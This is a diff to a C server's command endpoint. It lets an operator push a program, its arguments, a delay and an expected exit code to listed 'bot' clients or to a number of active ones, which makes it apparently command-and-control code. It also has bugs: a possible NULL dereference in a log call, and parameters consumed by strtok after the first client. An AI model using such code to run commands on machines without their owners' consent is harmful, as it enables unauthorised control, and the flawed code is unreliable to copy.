@@ -128,108 +128,118 @@ void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
 
 // Function to handle sending a command to a client
 void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
-    char bot_id[256] = {0}; // Declare bot_id
+    char bot_ids[1024] = {0};
+    char num_clients_str[16] = {0};
     char cmd_id[64] = {0};
     char program[256] = {0};
     char params[256] = {0};
-    int delay = 0;
-    int expected_code = 0;
     char delay_str[16] = {0};
     char expected_code_str[16] = {0};
 
-
     // Parse fields from the POST request
-    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id)); // Parse bot_id
+    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
+    mg_http_get_var(&hm->body, "num_clients", num_clients_str, sizeof(num_clients_str));
     mg_http_get_var(&hm->body, "cmd_id", cmd_id, sizeof(cmd_id));
     mg_http_get_var(&hm->body, "program", program, sizeof(program));
     mg_http_get_var(&hm->body, "params", params, sizeof(params));
     mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
     mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));
 
-    // Parse integers
-    delay = strlen(delay_str) > 0 ? atoi(delay_str) : 0;
-    expected_code = strlen(expected_code_str) > 0 ? atoi(expected_code_str) : 0;
+    
 
-    // Validate required fields
-    if (strlen(bot_id) == 0) {
-        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
-        return;
-    }
+    int delay = atoi(delay_str);
+    int expected_code = atoi(expected_code_str);
+    int num_clients = atoi(num_clients_str);
 
+    // Validate input
     if (strlen(program) == 0) {
         mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Program is required\"}");
         return;
     }
 
-    // Find the target client
-    Client *client = find_client(&hash_table, bot_id);
-    if (client == NULL) {
-        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
-        return;
-    }
+    size_t targeted_clients = 0;
 
-    // Build the Command struct
-    Command cmd = {
-        .cmd_id = "",
-        .delay = delay,
-        .program = strdup(program),
-        .expected_exit_code = expected_code,
-        .params = NULL // Initialize params to NULL
-    };
-    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
+    // If bot IDs are provided, target those specific clients
+    if (strlen(bot_ids) > 0) {
+        output_log("Found bot list, looping over and sending commands!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        char *bot_id = strtok(bot_ids, ",");
+        while (bot_id != NULL) {
+            Client *client = find_client(&hash_table, bot_id);
+            if (client != NULL && client->state == LISTENING) { // Only target active clients
+                Command cmd = {
+                    .cmd_id = "",
+                    .order_type = COMMAND_,
+                    .delay = delay,
+                    .program = strdup(program),
+                    .expected_exit_code = expected_code,
+                    .params = malloc(2 * sizeof(char *))
+                };
 
-    // Parse params into a null-terminated array
-    if (strlen(params) > 0) {
-        char *param_token = strtok(params, " ");
-        size_t param_count = 0;
+                strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
+                cmd.params[0] = strdup(params);
+                cmd.params[1] = NULL;
 
-        while (param_token != NULL) {
-            cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
-            cmd.params[param_count] = strdup(param_token);
-            param_count++;
-            param_token = strtok(NULL, " ");
+                if (send_command(client->socket, &cmd) == 0) {
+                    targeted_clients++;
+                }
+
+                free_command(&cmd);
+            } else {
+                output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
+            }
+            bot_id = strtok(NULL, ",");
         }
+    } else if (num_clients > 0) {
+        output_log("Found number of clients, sending command!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        // If no bot IDs are provided, target random active clients
+        for (size_t i = 0; i < hash_table.size && targeted_clients < num_clients; i++) {
+            Client *client = hash_table.table[i];
+            while (client != NULL && targeted_clients < num_clients) {
+                output_log("Sending to client %s with state %d!\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id, client->state);
+                if (client->state == LISTENING && client->socket > 0) { // Only target listening clients with valid sockets
+                    Command cmd = {
+                        .cmd_id = "",
+                        .order_type = COMMAND_,
+                        .delay = delay,
+                        .program = strdup(program),
+                        .expected_exit_code = expected_code,
+                        .params = NULL // Initialize params to NULL
+                    };
 
-        // Null-terminate the params array
-        cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
-        cmd.params[param_count] = NULL;
-    }
+                    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
 
-    output_log("Got Bot ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);
-    output_log("Got CMD ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.cmd_id);
-    output_log("Got program : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.program);
-    char buffer[1024] = {0};
-    size_t offset = 0;
+                    // Split the params string into individual parameters
+                    if (strlen(params) > 0) {
+                        size_t param_count = 0;
+                        char *param = strtok(params, " ");
+                        while (param != NULL) {
+                            cmd.params = realloc(cmd.params, (param_count + 2) * sizeof(char *)); // Allocate space for new param
+                            cmd.params[param_count] = strdup(param); // Copy the parameter
+                            param_count++;
+                            param = strtok(NULL, " ");
+                        }
+                        cmd.params[param_count] = NULL; // Null-terminate the params array
+                    }
 
-    if (cmd.params != NULL) {
-        for (size_t i = 0; cmd.params[i] != NULL; i++) {
-            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s ", cmd.params[i]);
+                    if (send_command(client->socket, &cmd) == 0) {
+                        targeted_clients++;
+                    }
+
+                    free_command(&cmd); // Free dynamically allocated fields
+                } else {
+                    output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
+                }
+                client = client->next;
+            }
         }
     }
-    output_log("Got params : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, buffer);
-    output_log("Got delay : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.delay);
-    output_log("Got expected code : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, expected_code);
 
-    // Write to log
-    char log_message[1024] = {0};
-    snprintf(log_message, sizeof(log_message), 
-            "Server : Executing command (%s) (%s) with delay (%d), code (%d)", 
-            cmd.program, 
-            buffer, // Params
-            cmd.delay, 
-            cmd.expected_exit_code);
-    write_to_client_log(client, log_message);
+    // Respond with the number of targeted clients
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\",\"targeted_clients\":%zu}", targeted_clients);
 
-    // Send the command to the client
-    if (send_command(client->socket, &cmd) < 0) {
-        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
-        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
-        free_command(&cmd); // Free dynamically allocated fields
-        return;
+    if (targeted_clients < num_clients) {
+        output_log("Only %zu active clients were available to target (requested: %d)\n", LOG_DEBUG, LOG_TO_CONSOLE, targeted_clients, num_clients);
     }
-
-    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
-    free_command(&cmd); // Free dynamically allocated fields
 }
 
 // Function to handle server status
@@ -503,6 +513,7 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
         } else if (strncmp(hm->uri.buf, "/api/upload", hm->uri.len) == 0) {
             handle_send_upload(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
+            output_log("Received send command request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
             handle_send_command(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
             handle_server_status(c, hm, socket, connect, mg_http_reply);
